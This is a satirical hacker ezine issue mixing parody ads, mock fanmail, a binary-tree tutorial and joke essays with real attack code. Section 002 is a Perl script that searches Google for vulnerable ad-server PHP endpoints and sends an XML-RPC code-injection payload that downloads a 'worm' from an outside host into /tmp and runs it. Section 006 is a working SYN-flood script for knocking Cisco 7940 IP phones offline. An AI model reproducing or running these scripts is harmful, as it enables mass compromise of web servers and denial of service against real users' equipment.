@@ -1,0 +1,693 @@
+*** CDEJ COMMEMORATIVE HAQR KIT SPECIAL OFFER ***
+
+  The first 50 readers of CDEJ who can come up with
+$2999.99 will receive a limited edition CDEJ haqr
+kit!  This kit includes everything you need to be
+well on your way to haqing computer machines.
+
+  Included in the kit is:
+
+  -- A pair of roller blades!
+
+  -- DOS 3.3 on 5.25" floppies!
+
+  -- A book of k0dez and shell accounts!
+
+  -- A wide veriety of hair dyes!
+     (blue, green, and more!)
+
+  -- Access to rotor's botnet!
+
+  -- Haqr dictionary, including
+     special catch-phrase section!
+     Catch phrases include:
+     "Yo man you zero cool?  MAN I THOUGHT
+     YOU WAS BLAQ!"
+
+************* LIMITED TIME ONLY! ****************
+
+
+
+     l'elephant avec les trunks huge
+               izzue quatre
+        HAPPY NEW YEAR TO YOU ALL
+            
+
+            ___       __
+           /   \____ /   \
+          /    / __ \     \
+         /    |  Oo  |     \   
+         \___/|      |\___/\
+            | |_|  |_|      \   
+            | |/|__|\|       \
+            |   |__|         |\
+            |   |__|   |_/  /  \
+            | @ |  | @ || @ |   '
+            |   |~~|   ||   |     -J. Elephant-
+            'ooo'  'ooo''ooo'
+
+
+       "CDEJ - leading all haqrs into 2006"
+
+
+:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D
+*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=**
+*              *WAREZ AND MORE WAREZ*                  * 
+*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=**
+:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D
+
+"y0h man yer trans?  DOOD I THOUGHT YOU WAS BLAQ!"
+                               -- the_sniff
+
+"If this doesn't work, I'll try luring them with candy!"
+                               -- emmanuel goldstein
+
+"If this doesn't work, I'll just force them."
+                               -- Capt. Crunch
+
+**=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.**
+*our newest member:      tip - "b4b0 sux i want to join cdej" *
+*best excuse:  "I can't remember if I haq'd the FBI yer       *
+*                     honor."  -- trans                       *
+*                                                             *
+*MONTHLY ASCII:          *= USA flag!                         *
+*                                                             * 
+*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=**.**
+* 000 -- Introduction           (kinghaqr)                    *
+. 001 -- Fanmail                (various lunatics)            .
+* 002 -- St00pid K0dez          (n0k14)                       *
+. 003 -- Binary Trees           (anonymous)                   .
+* 004 -- Logo 0day              (trans)                       *
+. 005 -- Be Famous              (red box chili pepper)        .
+* 006 -- cisco IP phone 7940 DoS(kokanin)
+. 007 -- :?
+* 010 -- Next Issue    (monkey longarms)                      *
+.                                                             .
+*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=*.*=**.**
+
+
+
+----------------------------< 000 -- INTRODUCTION
+>---------------------------- king haqr
+
+  Run the following text through the KDE 'Star Wars' screen saver, and
+whistle or play on your MP3 player the opening theme for 'Star Wars'.
+If you do not have the KDE 'Star Wars' screen saver, upgrade your KDE.
+k.thx
+
+
+
+                        CDEJ IV
+                  Return of the Haqr
+
+ It was a dark time for the rebellion.  Many phrack and b4b0
+ type haqrs thought that Obi-Wan-Longarms, Luke w01f-haqr,
+ and Trans-Solo were fedz; that they were actually working
+ for the empire.  These kids, having reached their 20s in
+ physical age but their minds being still somewhere around
+ 13, actually believed that in a world of terrorism, war,
+ and US/China information arms race, that fedz had time to
+ join #phrack and #b4b0 and look for these moronic LoD
+ wanna-be's.  It was sad enough that they never grew up,
+ but becoming paranoid and attributing way too much focus
+ onto their lame way of life just made things worse.
+
+ What's more, some of the inhabitants of the paranoid
+ schizophrenic galaxy had been believing this way for
+ years, hanging out in #2600 and other lame places, trying
+ desperately to justify their lives by convincing themselves
+ that they are super-intelligent computer haqrs.  They went
+ from the 'normal' 2600 phase (occurs in most lives around
+ age 13, to fill the void sesame street left) to a terribly
+ abnormal phase (up to mid twenties, or in the case of
+ certain pedophiles, into retirement).
+
+ We join our heros as the epic struggle between haqr and
+ idiot continues.....
+
+
+                         * * *
+
+  WE ONLY PUBLISH WHAT IS SENT IN BY EMAIL.  STOP SAYING
+  THAT WE RIPPED YER STUFF OFF, CAUSE YOU MUST HAVE SENT
+  IT IN WHILE HAMMERED.  STOP BEFORE WE HAQ YER POWERMAQ
+
+
+----------------------------< 001 -- fanmail
+>---------------------------- various lunatics
+
+:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?
+
+   Dear CDEJ:
+
+http://httpd.apache.org/docs/2.0/mod/mod_dav.html
+http://www.webdav.org
+http://www.webdav.org/mod_dav/
+
+The Mod_Dav.c does not check for buffer overflows when copying to
+destination.  Line Number: 1745  Actual Line: strcpy(s, elts[i].key); 
+
+This module provides class 1 and class 2 WebDAV ('Web-based Distributed
+Authoring and Versioning') functionality for Apache. This extension to
+the HTTP protocol allows creating, moving, copying, and deleting resources
+and collections on a remote web server we gotta find out what uses it..
+how its used.. what's calling that strcpy, etc.. if you do all the
+research for me; I'll write it setup a test box and before you compile
+mod_dav put a printf("Got here\n"); before the strcpy and play around with
+it until you get that printf this could be benefitial cause it uses
+"Remote databasing" remote databasing usually would mean private data
+such as CC#s etc..
+
+http://httpd.apache.org/docs/2.0/mod/mod_dav.html
+http://www.webdav.org
+http://www.webdav.org/mod_dav/
+
+   - Some l4m3r
+
+:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?
+
+  Dear Some l4m3r:
+
+   Thanks for the offer, but in the future, it would probably be best
+to just not waste your time.  Chances are that any bug you discover
+in any software was already discovered or anticipated by cdej
+members, years ago.  Nice try, though.  F for eFfort.
+
+:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?
+
+  Dear CDEJ:
+
+  I am representing one [NAME WITHHELD BY STAFF] who is fileing
+suit against you and your organization for reproducing, without
+permission, a technical article.  This technical article,
+entitled [NAME WITHHELD BY STAFF] is the sole property of
+my client, and reproducing this article without permission
+violates numerous intellectual property laws.
+
+  Please contact us as soon as possible so that we can
+arrange a compromise on the issue, as my client wishes to
+resolve this matter as quickly as possible.
+
+   - The Law Offices of C.H. Babour and T.T. Regaro
+
+:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?:?
+
+  Dear The Law Offices of C.H. Babour and T.T. Regaro:
+
+  Thanks for your interest in CDEJ advertising literature!
+A helpful advertising campaign packet has been sent to your
+place of residence or employment free of charge.  Should you
+choose to pursue advertising options with CDEJ and CDEJ ezine,
+contact a sales representative (sales@cdej.org) to learn about
+our wide array of promotional items for the workspace,
+including stress balls, memo pads, pens, and pocket protectors.
+
+   Thanks!
+
+  PS: Longarms lives in Africa.  w01f lives in Lebannon.  Trans
+  hasn't had a home in years.  Good luck with the lawsuit.
+
+:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?:D?
+
+
+-------------< 002 -- stupid perl that might exploit something
+>------------- Anonymous
+
+#!/usr/bin/perl -w
+
+use LWP::UserAgent; 
+
+$brws = new LWP::UserAgent; 
+$brws->agent("Internet Explorer 6.0"); 
+%h = ();
+
+$cmd="cd /tmp;wget www.corestorm.com/worm;mv worm bash;./bash";
+
+
+@yayarray = ("inurl:adimage.php", "inurl:adimage.php \"de\"",
+              "inurl:adimage.php \"ru\"", "inurl:adimage.php \"fr\"",
+              "inurl:adimage.php \"fi\"", "inurl:adimage.php \"pl\"",
+              "inurl:adframe.php", "inurl:adframe.php \"de\"",
+              "inurl:adframe.php \"ru\"", "inurl:adframe.php \"fr\"",
+              "inurl:adframe.php \"fi\"", "inurl:adframe.php \"pl\"",
+              "inurl:adjs.php", "inurl:adjs.php \"de\"",
+              "inurl:adjs.php \"ru\"", "inurl:adjs.php \"fr\"",
+              "inurl:adjs.php \"fi\"", "inurl:adjs.php \"pl\"",
+              "inurl:adclick.php", "inurl:adclick.php \"de\"",
+              "inurl:adclick.php \"ru\"", "inurl:adclick.php \"fr\"",
+              "inurl:adclick.php \"fi\"", "inurl:adclick.php \"pl\"");
+
+
+foreach $line (@yayarray) {
+	open(F, "lynx -dump \"http://www.google.com\/search?hl=us&lr=&q=$line\"|") || die "$!";
+	open(F, "google.sucks") || die "$!";
+	if($line =~ /^.*\:(.*?.php).*/) { $php = "$1"; }
+	while(<F>) {
+		if(/cache|search/) { next; }
+		if(/^.*?\d+.*?(http:\/\/.*?)\/$php.*/) {
+			$h{$1}++;
+		}
+	}
+}
+
+foreach $line (sort keys %h) {
+	print "Found host: $line.  Exploiting...\n";
+	&exp($line);
+}
+
+
+
+
+sub exp($host) { 
+	local($host) = @_;
+
+	if ( !$host ) {
+		die("$!: Did not receive \$host.");
+	}
+
+	while ( $host ) {
+
+		$data = "<?xmlversion=\"1.0\"?><methodCall><methodName>foo.bar</methodName><params><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><name>','')); system('$cmd'); die;/*</name></value></param></params></methodCall>";
+		$send = new HTTP::Request POST => $host;
+		$send->content($data);
+		$gots = $brws->request($send);
+		$show = $gots->content;
+	
+		if ( $show =~ /<b>([\d]{1,10})<\/b><br \/>(.*)/is ) {
+			print $2 . "\n";
+		} else {
+			print "$show\n";
+		}
+	}
+}
+
+
+----------------------------< 003 -- binary trees
+>---------------------------- anonymous
+
+      (binary trees dedicated to monkey longarms)
+
+      The binary tree is a fundamental data structure used in computer science. 
+      The binary tree is a useful data structure for rapidly storing sorted data 
+      and rapidly retrieving stored data. A binary tree is composed of parent 
+      nodes, or leaves, each of which stores data and also links to up to two 
+      other child nodes (leaves) which can be visualized spatially as below the 
+      first node with one placed to the left and with one placed to the right. 
+      It is the relationship between the leaves linked to and the linking leaf, 
+      also known as the parent node, which makes the binary tree such an 
+      efficient data structure. It is the leaf on the left which has a lesser 
+      key value (ie, the value used to search for a leaf in the tree), and it is 
+      the leaf on the right which has an equal or greater key value. As a 
+      result, the leaves on the farthest left of the tree have the lowest 
+      values, whereas the leaves on the right of the tree have the greatest 
+      values. More importantly, as each leaf connects to two other leaves, it is 
+      the beginning of a new, smaller, binary tree. Due to this nature, it is 
+      possible to easily access and insert data in a binary tree using search 
+      and insert functions recursively called on successive leaves.
+      The typical graphical representation of a binary tree is essentially that 
+      of an upside down tree. It begins with a root node, which contains the 
+      original key value. The root node has two child nodes; each child node 
+      might have its own child nodes. Ideally, the tree would be structured so 
+      that it is a perfectly balanced tree, with each node having the same 
+      number of child nodes to its left and to its right. A perfectly balanced 
+      tree allows for the fastest average insertion of data or retrieval of 
+      data. The worst case scenario is a tree in which each node only has one 
+      child node, so it becomes as if it were a linked list in terms of speed. 
+      The typical representation of a binary tree looks like the following:
+			
+						       10
+						     /    \
+						    6      14
+						   / \    /  \
+						  5   8  11  18
+
+	The node storing the 10, represented here merely as 10, is the root node, 
+      linking to the left and right child nodes, with the left node storing a 
+      lower value than the parent node, and the node on the right storing a 
+      greater value than the parent node. Notice that if one removed the root 
+      node and the right child nodes, that the node storing the value 6 would be 
+      the equivalent a new, smaller, binary tree.
+      The structure of a binary tree makes the insertion and search functions 
+      simple to implement using recursion. In fact, the two insertion and search 
+      functions are also both very similar. To insert data into a binary tree 
+      involves a function searching for an unused node in the proper position in 
+      the tree in which to insert the key value. The insert function is 
+      generally a recursive function that continues moving down the levels of a 
+      binary tree until there is an unused leaf in a position which follows the 
+      rules of placing nodes. The rules are that a lower value should be to the 
+      left of the node, and a greater or equal value should be to the right. 
+      Following the rules, an insert function should check each node to see if 
+      it is empty, if so, it would insert the data to be stored along with the 
+      key value (in most implementations, an empty node will simply be a NULL 
+      pointer from a parent node, so the function would also have to create the 
+      node). If the node is filled already, the insert function should check to 
+      see if the key value to be inserted is less than the key value of the 
+      current node, and if so, the insert function should be recursively called 
+      on the left child node, or if the key value to be inserted is greater than 
+      or equal to the key value of the current node the insert function should 
+      be recursively called on the right child node. The search function works 
+      along a similar fashion. It should check to see if the key value of the 
+      current node is the value to be searched. If not, it should check to see 
+      if the value to be searched for is less than the value of the node, in 
+      which case it should be recursively called on the left child node, or if 
+      it is greater than the value of the node, it should be recursively called 
+      on the right child node. Of course, it is also necessary to check to 
+      ensure that the left or right child node actually exists before calling 
+      the function on the node.
+
+      Because binary trees have log (base 2) n layers, the average search time 
+      for a binary tree is log (base 2) n. To fill an entire binary tree, 
+      sorted, takes roughly log (base 2) n * n. Lets take a look at the 
+      necessary code for a simple implementation of a binary tree. First, it is 
+      necessary to have a struct, or class, defined as a node.
+
+struct node
+{
+  int key_value;
+  node *left;
+  node *right;
+};
+
+	The struct has the ability to store the key_value and contains the two 
+      child nodes which define the node as part of a tree. In fact, the node 
+      itself is very similar to the node in a linked list. A basic knowledge of 
+      the code for a linked list will be very helpful in understanding the 
+      techniques of binary trees. Essentially, pointers are necessary to allow 
+      the arbitrary creation of new nodes in the tree.
+
+      It is most logical to create a binary tree class to encapsulate the 
+      workings of the tree into a single area, and also making it reusable. The 
+      class will contain functions to insert data into the tree and to search 
+      for data. Due to the use of pointers, it will be necessary to include a 
+      function to delete the tree in order to conserve memory after the program 
+      has finished.
+	
+class btree
+{
+  node *root;
+  btree();
+  ~btree();
+  void destroy_tree(node *leaf);
+  void insert(int key, node *leaf);
+  node *search(int key, node *leaf);
+  public:
+  void insert(int key);
+  node *search(int key);
+  void destroy_tree();
+};
+
+	The insert and search functions that are public members of the class are 
+      designed to allow the user of the class to use the class without dealing 
+      with the underlying design. The insert and search functions which will be 
+      called recursively are the ones which contain two parameters, allowing 
+      them to travel down the tree. The destroy_tree function without arguments 
+      is a front for the destroy_tree function which will recursively destroy 
+      the tree, node by node, from the bottom up. 
+
+      The code for the class would look similar to the following:
+
+btree::btree()
+{
+  root=NULL;
+}
+
+It is necessary to initialize root to NULL for the later functions to be 
+      able to recognize that it does not exist.
+
+btree::~btree()
+{
+  destroy_tree();
+}
+
+	The destroy_tree function will set off the recursive function destroy_tree 
+      shown below which will actually delete all nodes of the tree.
+void destroy_tree(node *leaf)
+{
+  if(leaf!=NULL)
+  {
+    destroy_tree(leaf->left);
+    destroy_tree(leaf->right);
+    delete leaf;
+  }
+}
+
+	The function destroy_tree goes to the bottom of each part of the tree, 
+      that is, searching while there is a non-null node, deletes that leaf, and 
+      then it works its way back up. The function deletes the leftmost node, 
+      then the right child node from the leftmost node's parent node, then it 
+      deletes the parent node, then works its way back to deleting the other 
+      child node of the parent of the node it just deleted, and it continues 
+      this deletion working its way up to the node of the tree upon which 
+      delete_tree was originally called. In the example tree above, the order of 
+      deletion of nodes would be 5 8 6 11 18 14 10. Note that it is necessary to 
+      delete all the child nodes to avoid wasting memory.
+
+void btree::insert(int key, node *leaf)
+{
+  if(key< leaf->key_value)
+  {
+    if(leaf->left!=NULL)
+     insert(key, leaf->left);
+    else
+    {
+      leaf->left=new node;
+      leaf->left->key_value=key;
+      leaf->left->left=NULL;    //Sets the left child of the child node to null
+      leaf->left->right=NULL;   //Sets the right child of the child node to null
+    }  
+  }
+  else if(key>=leaf->key_value)
+  {
+    if(leaf->right!=NULL)
+      insert(key, leaf->right);
+    else
+    {
+      leaf->right=new node;
+      leaf->right->key_value=key;
+      leaf->right->left=NULL;  //Sets the left child of the child node to null
+      leaf->right->right=NULL; //Sets the right child of the child node to null
+    }
+  }
+}
+
+	The case where the root node is still NULL will be taken care of by the 
+      insert function that is nonrecursive and available to non-members of the 
+      class. The insert function searches, moving down the tree of children 
+      nodes, following the prescribed rules, left for a lower value to be 
+      inserted and right for a greater value, until it finds an empty node which 
+      it creates using the 'new' keyword and initializes with the key value 
+      while setting the new node's child node pointers to NULL. After creating 
+      the new node, the insert function will no longer call itself.
+
+node *btree::search(int key, node *leaf)
+{
+  if(leaf!=NULL)
+  {
+    if(key==leaf->key_value)
+      return leaf;
+    if(key<leaf->key_value)
+      return search(key, leaf->left);
+    else
+      return search(key, leaf->right);
+  }
+  else return NULL;
+}
+
+	The search function shown above recursively moves down the tree until it 
+      either reaches a node with a key value equal to the value for which the 
+      function is searching or until the function reaches an uninitialized node, 
+      meaning that the value being searched for is not stored in the binary 
+      tree. It returns a pointer to the node to the previous instance of the 
+      function which called it, handing the pointer back up to the search 
+      function accessible outside the class.
+
+void btree::insert(int key)
+{
+  if(root!=NULL)
+    insert(key, root);
+  else
+  {
+    root=new node;
+    root->key_value=key;
+    root->left=NULL;
+    root->right=NULL;
+  }
+}
+
+	The public version of the insert function takes care of the case where the 
+      root has not been initialized by allocating the memory for it and setting 
+      both child nodes to NULL and setting the key_value to the value to be 
+      inserted. If the root node already exists, insert is called with the root 
+      node as the initial node of the function, and the recursive insert 
+      function takes over.
+
+node *btree::search(int key)
+{
+  return search(key, root);
+}
+
+	The public version of the search function is used to set off the search 
+      recursion at the root node, keeping it from being necessary for the user 
+      to have access to the root node.
+
+void btree::destroy_tree()
+{
+  destroy_tree(root);
+}
+
+	The public version of the destroy tree function is merely used to 
+      initialize the recursive destroy_tree function which then deletes all the 
+      nodes of the tree.
+
+
+----------------------------< 004 -- logo 0day
+>---------------------------- trans
+
+  Here is some Logo 0day.  USE AT YOUR OWN RISK!
+
+# l0g0.logo
+# trans (trans@cobol-coders-club.com)
+# fractal buffer overflow offset pattern generator
+# k0dez from cdej/#efnet
+
+a = 1
+
+go 20,20
+
+print "Hello I am a turtle"
+
+repeat 10 [
+  repeat a [
+    forward 10 + a
+    turnleft 12 + a
+  ]
+
+  repeat a [
+    forward 20 + a
+    turnleft 12 + a
+  ]
+
+  a = a + a
+]
+
+
+----------------------------< 005 -- be famous!
+>---------------------------- red box chili pepper
+
+  [ ED. NOTE:  The venerable haqr of (NOTE: find out what
+    he ever haqd and put here) has returned and is as fresh
+    as ever!  After convincing thousands of kids to ruin
+    their lives and to needlessly annoy others, even into
+    his mid twenties, he took a short hiatus to attempt a
+    family.  This having failed, he is back with new
+    material for all the haqr community! ]
+
+
+  Ok so you want to be famous?  Well there are various techniques
+which include:
+
+	The "Phrack" Technique:
+
+        In this technique, you simply stand on the shoulders
+        of other people.  Pretend that the people who wrote about
+        sequential breaking of 3 digit codes and blowing things
+        up were brilliant, then reproduce a few lines of trash
+        from yer favorite book, and yer all set!
+
+        The "2600" Technique:
+
+        Lonely?  Dateless?  Born decades after the hippy generation?
+        That's ok, take advantage of America's youth!  Bennefits
+        include a mansion in New York, endless praise from teenage
+        kids with tons of angst, and heavy denial!
+
+        The "Securityfocus" Technique:
+
+        Don't fit in anywhere else?  Take a cheesy picture of yourself
+        and send it in to securityfocus.com, along with some cheesy
+        filth (trick them by saying it's a 'technical article'.)
+        Works best if you nelgect to write about anything original.
+
+        The "PLA" Technique:
+
+        This one is my favorite.  First, stop taking any and all
+        hyperactivity / depression medicine your mom forces down
+        your throat.  Then, play pranks on everyone and include some
+        fuzzy phone jargon to appear like you're haqing!  Fun and
+        easy.
+
+        The "FightClub" Technique:
+
+        Dangerous, but popular with today's youth.  Named for the
+        favorite movie of everyone who likes the technique.  First,
+        come up with some stupid political principles, and share
+        them with like-minded individuals.  Then, pretend to haq
+        for the cause!  Be creative!  The cause can range from
+        anything from anti-whitehat, to free tibet!  Careful,
+        participants have a high suicide rate!
+
+        The "Local Hero" Technique:
+
+        A good technique for the man who has little time.  After
+        your job at Burger King, show up at a 2600 meeting.  Talk
+        to the other 'local heros', carefully shunning any younger
+        people.  If someone actually ever asks you anything
+        technical, make something up... ie. "Didn't you read the
+        article I wrote in LODTJ2 about this?"
+
+        Conclusion:
+
+        The good thing about these techniques is that none of them
+        require any actual technial skill!  Instead of wasting your
+        time studying and carefully avoding college, you can spend
+        this precious time coloring your hair, riding a motorcycle,
+        and telling everyone you see how elite you are!
+
+        TILL NEXT TIME!!!
+
+
+----------------------------< 006
+>----------------------------
+
+
+#!/usr/bin/perl
+# This is made for trashing cisco 7940 ip phones. kokanin made/discovered this.
+# A packetcount of 1000 and a packetdelay of 0.002 sent to port 80 makes my 
+# phone reboot - play with the settings and stuff. PRIVATE PRIVATE PRIVATE!!!
+# not private anymore. Vulnerable phones are running ver. 7.0(2.0) using the skinny
+# protocol - this is not for the SIP firmware.
+
+use Net::RawIP;
+use Time::HiRes;
+$pkt = new Net::RawIP;
+die "Usage $0 <src> <dst> <target port> <number of pkts> <packet delay>" unless ($ARGV[4]);
+$pkt->set({
+        ip => {
+                saddr => $ARGV[0],
+                daddr => $ARGV[1] 
+                },
+        tcp=> { dest => $ARGV[2],
+                syn => 1,
+                seq => 0,
+                ack => 0}
+        });
+for(1..$ARGV[3]){ $pkt->set({tcp=>{source=>int(rand(65535))}});Time::HiRes::sleep($ARGV[4]); $pkt->send; };
+
+
+----------------------------< 007 --
+>---------------------------- CDEJ STAFF
+
+----------------------------< 010 -- next issue
+>---------------------------- monkey longarms
+
+COMING IN NEXT ISSUE:
+
+  "My New Mainifesto: Why I Hate Working at McDonalds" -- The Mentor
+
+  "News from County Jail" -- Chrak
+
+  "You Can Say Whatever You Want About Me, I Still Have Billions
+   of Dollars." -- Bill Gates
+
+  "Why isn't anyone hire me?  I'm famous, for pete's sake!"
+                               -- Kevin Mitnick
